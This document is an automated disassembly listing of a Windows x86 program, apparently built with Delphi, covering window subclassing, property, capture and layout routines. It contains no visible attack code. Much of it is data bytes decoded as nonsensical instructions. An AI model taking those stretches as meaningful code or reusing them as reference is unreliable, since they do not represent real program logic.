test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x9c00450c
adc [ ebp ] al
xor [ esi ] cl
inc ebp
add [ eax ] bl
adc [ ebp ] al
inc eax
adc [ ebp ] al
sub al 0xd
inc ebp
add [ eax + eax ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax + 0xc180317 ]
inc ebp
add [ eax ] ah
or al 0x45
add [ eax + 0x800450d ] bl
adc [ ebp ] eax
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
mov al [ 0x540044b0 ]
test [ eax + eax - 0x34 ] al
outsd
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add al [ eax ]
or al [ edx + 0x6c ]
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax + 0x24 ] cl
inc edx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
and al 0x42
add [ edi + ebp * 2 + 0x45 ] bl
add [ edi + ebp * 2 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add eax [ eax ]
pop es
inc edx
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
inc esp
jb r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add al 0x0
pop es
inc ecx
insb
insb
outsd
arpl [ edx + 0x79 ] ax
pushad
arpl [ ebp ] ax
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] al
push es
dec ebp
popad
ja r-xdata
mov ah 0x59
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
jae r-xdata
outsb
push ebx
je r-xdata
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
inc eax
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x74646957
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x59
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jl r-xdata
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
insb
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax + ebp * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x4563b474
add [ ebx ] al
add bh bh
inc ebx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ ecx ] cl
dec ecx
insd
popad
push esp
jns r-xdata
ja r-xdata
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
push eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
inc ecx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax ] al
add eax 0xffffff8c
jmp r-xdata
add [ eax ] al
add [ ecx + ebx * 2 + 0x280044 ] dh
add [ eax ] al
mov al 0x10
inc eax
adc [ eax ] al
xor al 0x0
add bh bh
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_451eb4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4517a0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4517a0
push eax
mov edx 0x1
mov eax ebx
call sub_451734
push eax
mov edx 0x2
mov eax ebx
call sub_451734
pop edx
pop ecx
call sub_4170ec
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b34
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_445a5c
cmp al 0x5a
inc esp
add [ esi + 0x5a ] al
inc esp
add [ eax + 0x5a ] dl
inc esp
add cl al
pop ecx
inc esp
add cl cl
pop ecx
inc esp
add cl dl
pop ecx
inc esp
add cl bl
pop ecx
inc esp
add dh ah
pop ecx
inc esp
add bl dh
pop ecx
inc esp
add [ eax ] al
pop edx
inc esp
add [ 0x1a00445a ] cl
pop edx
inc esp
add [ edi ] ah
pop edx
inc esp
add [ edx + ebx * 2 ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x5a5ce870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebx
inc esp
add [ edx + ebx * 2 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x5b
inc esp
add [ eax ] bh
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
jo r-xdata
sub al 0x45
add [ esi + ebp + 0x33a80045 ] ah
inc ebp
add [ ecx + esi + 0x45 ] bl
add [ esp + ebx + 0x45 ] dh
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add ah bl
xor [ eax ] al
fcomp [ 0x1e300045 ]
inc ebp
add [ eax - 0x47ffbae1 ] ch
pop ds
inc ebp
add [ eax + 0x27 ] bh
inc ebp
add [ eax + 0x2a ] ah
inc ebp
add [ eax - 0x5bffbad4 ] ah
inc ebp
add [ eax + 0x5c004533 ] ch
xor [ ebp ] eax
je r-xdata
add [ eax ] al
loopne r-xdata
mov eax eax
test [ ebx + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x280044 ] al
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x44 ] bl
add [ eax ] ch
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jl r-xdata
add [ ebx + ebp ] bh
inc ebp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
inc ebp
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
add al bh
mov ah 0x44
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x5c ] 0x5c004029
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
lodsb [ esi ]
inc edi
inc ebp
add [ ecx + ebp + 0x40 ] bl
add [ edx ] dl
push esp
inc ebx
jne r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop esp
inc esp
add [ eax ] cl
add al [ eax ]
add [ eax - 0x43ffbbb2 ] ch
adc al 0x42
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x6004540 ] dl
push esp
dec ebp
outsd
jne r-xdata
pop esp
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ eax + 0x6a ] dl
cld
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
je r-xdata
adc [ edx ] eax
fcom [ edx + eax * 2 ]
nop
fcomp [ ebx + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
add [ eax ] eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sti
or al 0xfc
[ edx - 0x10 ]
insb
nop
loopne r-xdata
add [ ebx + 0x18c80 ] cl
inc esp
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax + 0x74 ] al
push ds
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ebp
or [ eax - 0x18 ] dl
fimul [ edx ]
cld
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
insb
fcomp [ ebx + 0x44 ]
add [ edx + edx * 2 + 0x44 ] bl
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
or [ eax - 0x18 ] dl

outsd
insb
jae r-xdata
add [ ebp + 0x108a0040 ] cl
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_445d20
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_445dd8
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_445e0c
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404378
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_445dd8
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_445e68
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_44604c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c4e0
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4043d8
mov eax edi
mov edx esi
call sub_403f0c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446090
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c4e0
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4043d8
mov eax edi
mov edx esi
call sub_403f0c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4460d4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_44a198
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_446150
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax ebx
call sub_44f7d8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_4461fc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_418700
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_446230
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7d8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_446258
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_446230
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_4461fc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4185a4
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41877c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4462b4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4185d8
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418700
mov edx 0x8
call sub_4026ec
inc esi
dec ebx
jne r-xdata
sub_4462e8
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_418700
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_4461fc
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_44634c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_4463ac
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403078
mov edx esp
mov eax esi
call sub_40411c
add esp 0x100
pop esi
pop ebx
retn
sub_4463e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4464b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44750c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_446e94
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b7c
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_446e94
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44750c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_446e94
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44750c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_4464b7
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44750c
sub_446510
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44653a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4465a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44634c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_4465d0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403324
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_4465fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403324
xor edx edx
sub_446654
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_451420
sub_446674
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_451408
sub_446698
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_446580
mov dl 0x1
mov eax [ r-xdata ]
call sub_424890
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42b858
mov edx eax
mov eax esi
call sub_424a0c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4466fc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_44672c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4465a4
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_446788
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403324
pop edi
pop esi
pop ebp
retn 0x4
sub_4467ac
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_4467d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4467ac
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4467ac
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44688c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_4468f8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_446d48
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_445e0c
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
